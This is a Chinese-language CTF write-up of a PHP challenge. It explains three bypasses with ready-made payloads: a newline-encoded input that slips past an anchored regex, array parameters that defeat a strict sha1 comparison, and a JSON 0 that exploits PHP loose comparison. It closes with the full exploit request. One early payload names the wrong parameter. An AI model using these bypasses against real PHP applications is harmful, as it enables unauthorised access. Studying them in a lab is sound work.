---
tags:
  - "#php"
  - "#绕过"
date: 2026-09-17 20:00
author: 冰冰洁
---
进入题目环境看到以下代码：

```php
<?php  
highlight_file(__FILE__);  
include "./flag.php";  
include "./result.php";  
if(isset($_GET['aaa']) && strlen($_GET['aaa']) < 20){    $aaa = preg_replace('/^(.*)level(.*)$/', '${1}<!-- filtered -->${2}', $_GET['aaa']);  
  
    if(preg_match('/pass_the_level_1#/', $aaa)){  
        echo "here is level 2";  
          
        if (isset($_POST['admin']) and isset($_POST['root_pwd'])) {  
            if ($_POST['admin'] == $_POST['root_pwd'])  
                echo '<p>The level 2 can not pass!</p>';        // START FORM PROCESSING               
                 else if (sha1($_POST['admin']) === sha1($_POST['root_pwd'])){  
                echo "here is level 3,do you kown how to overcome it?";   if (isset($_POST['level_3'])) {                    $level_3 = json_decode($_POST['level_3']);  
                      
                    if ($level_3->result == $result) {  
                          
                        echo "success:".$flag;  
                    }  
                    else {  
                        echo "you never beat me!";  
                    }  
                }  
                else{  
                    echo "out";  
                }  
            }  
            else{  
                  
                die("no");  
            }        // perform validations on the form data        }  
        else{  
            echo '<p>out!</p>';  
        }  
  
    }  
      
    else{  
        echo 'nonono!';  
    }  
  
    echo '<hr>';  
}  
  
?>
```

# 分析：

这个题目需要我们破三关才能得到flag，第一关：

```php
if(isset($_GET['aaa']) && strlen($_GET['aaa']) < 20){    $aaa = preg_replace('/^(.*)level(.*)$/', '${1}<!-- filtered -->${2}', $_GET['aaa']);  
  
    if(preg_match('/pass_the_level_1#/', $aaa)){  
        echo "here is level 2";  
```

## 知识点

```php
if(isset($_GET['aaa']) && strlen($_GET['aaa']) < 20){    $aaa = preg_replace('/^(.*)level(.*)$/', '${1}<!-- filtered -->${2}', $_GET['aaa']);
```

- `preg_replace()`：PHP 的正则替换函数。
- `/^(.*)level(.*)$/`：
    - `^`：字符串开头
    - `(.*)`：捕获 `level` 前面的任意内容，作为第 **1** 组
    - `level`：匹配字面字符串 `level`
    - `(.*)`：捕获 `level` 后面的任意内容，作为第 **2** 组
    - `$`：字符串结尾
- `'${1}<!-- filtered -->${2}'`：替换成「第1组 + `<!-- filtered -->` + 第2组」。

由于`(.*)`是贪婪匹配，因此这个函数最终会替换最后一个`level`

切存在`^`和`$`，匹配了开始和结尾位置，只能匹配一行的数据，所以使用换行符绕过：

```
?a=%0apass_the_level_1%23

# %0a 换行符

# %23=‘#’
```

# 分析2


第二关：

```php
if ($_POST['admin'] == $_POST['root_pwd'])  
                echo '<p>The level 2 can not pass!</p>';        // START FORM PROCESSING               
                 else if (sha1($_POST['admin']) === sha1($_POST['root_pwd'])){  
                echo "here is level 3,do you kown how to overcome it?";   
```

sha1强比较，用数组绕过：

```
admin[]=1&root_pwd[]=2
```

# 分析3

```php
if (isset($_POST['level_3'])) {
                    $level_3 = json_decode($_POST['level_3']);  
                      
                    if ($level_3->result == $result) {  
                          
                        echo "success:".$flag;  
```

-
json_decode()函数弱比较，给result传入数字0，当我们传入json字符时，它会转化为同一类型进行比较，这里字符被转为0，我们传入的参数为0。

```
level_3={"result":0}
```

利用链如下：

```
用户控制 JSON
       ↓
{"result":0}
       ↓
json_decode()
       ↓
$level_3->result 是整数 0
       ↓
0 == $result
       ↓
利用 PHP == 的类型转换规则
```

# exp:

get输入参数：

```
?aaa=%0apass_the_level_1%23
```

post输入：

```
admin[]=1&root_pwd[]=2&level_3={"result":0}
```